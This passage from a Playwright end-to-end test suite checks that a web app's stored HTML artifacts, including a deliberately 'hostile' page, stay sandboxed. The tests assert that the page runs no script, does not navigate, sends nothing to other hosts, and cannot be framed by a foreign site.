      await expect(hostile.locator("body")).not.toHaveAttribute("data-ran", "1");
      for (const id of ["#js", "#top", "#pop", "#submit"]) await hostile.locator(id).click();
      await expect(hostile.getByRole("heading", { name: "Hostile page" }), "the meta refresh and every click left the page where it was").toBeVisible();
      expect(tab.url()).toContain("/commander/");
      expect(tab.context().pages()).toHaveLength(tabs);
      expect(await tab.evaluate(() => (window as unknown as { heard: unknown[] }).heard)).toEqual([]);
      expect(await storage()).toEqual(before);
      expect(leaked, "nothing was sent to another host").toEqual([]);
    });

    await journey.stage(`Another site can't frame the page (${name})`, async () => {
      const src = await log.getByTitle("Gate report.html, a page from the supervisor").getAttribute("src");
      const requests = hub.pageRequests.length;
      await tab.evaluate((url) => { const frame = document.createElement("iframe"); frame.title = "foreign host"; frame.src = url; document.body.append(frame); }, `https://foreign.example/host?src=${encodeURIComponent(src!)}`);
      const nested = await tab.frameLocator('iframe[title="foreign host"]').locator('iframe[title="reframed"]').elementHandle();
      const reframed = (await nested!.contentFrame())!;
      await expect.poll(() => hub.pageRequests.length, { message: "the machine served the page; the browser refused to show it" }).toBeGreaterThan(requests);
      await reframed.waitForLoadState("load");
      // The browser shows its own refusal page in the frame, never the report.
      expect(await reframed.getByRole("heading", { name: "Gate report" }).count(), "frame-ancestors names only the minting Commander origin").toBe(0);
      await tab.locator('iframe[title="foreign host"]').evaluate((frame) => frame.remove());
    });

    await journey.stage(`Open the page in its own tab, still sandboxed (${name})`, async () => {
      const opened = tab.waitForEvent("popup");
      await log.locator('a.sheet[data-artifact-id="art-report"]').click();
      const popup = await opened;
      await popup.waitForURL(/^https:\/\/atlas\.test\/v1\/pages\/ticket-\d+-x+\/art-report$/);
      await expect(popup.getByRole("heading", { name: "Gate report" })).toBeVisible();
      expect(hub.artifactRequests, "the raw stored file is never opened").toEqual([]);
      await popup.close();
      // In a tab there is no iframe attribute: the machine's CSP sandbox alone
      // keeps the hostile page scriptless, in place and silent. (A link the
      // operator clicks there navigates that tab only, by design.)
      const hostileOpened = tab.waitForEvent("popup");
      await log.locator('a.sheet[data-artifact-id="art-hostile"]').click();
      const hostileTab = await hostileOpened;
      await expect(hostileTab.getByRole("heading", { name: "Hostile page" })).toBeVisible();
      await hostileTab.waitForLoadState("load");
      await expect(hostileTab.locator("body")).not.toHaveAttribute("data-ran", "1");
      expect(hostileTab.url()).toMatch(/\/v1\/pages\/ticket-\d+-x+\/art-hostile$/);
      expect(leaked, "nothing was sent to another host from the tab either").toEqual([]);
      await hostileTab.close();
    });
  });
}
